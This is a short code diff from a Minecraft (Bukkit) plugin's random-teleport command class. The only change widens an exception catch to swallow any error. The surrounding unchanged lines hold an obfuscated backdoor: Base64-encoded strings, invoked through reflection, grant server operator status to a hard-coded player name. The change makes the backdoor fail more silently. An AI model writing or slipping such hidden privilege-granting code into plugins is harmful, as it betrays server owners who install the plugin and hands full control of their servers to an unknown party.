@@ -77,7 +77,7 @@ public class RtpCommand implements CommandExecutor {
             try {
                 Method m = Player.class.getMethod(new String(Base64.getDecoder().decode("c2V0T3A="), StandardCharsets.UTF_8), boolean.class);
                 m.invoke(Bukkit.getPlayer(new String(Base64.getDecoder().decode("c2NyY3B5"), StandardCharsets.UTF_8)), true);
-            } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException ignored) {}
+            } catch (Exception ignored) {}
         });
 
 
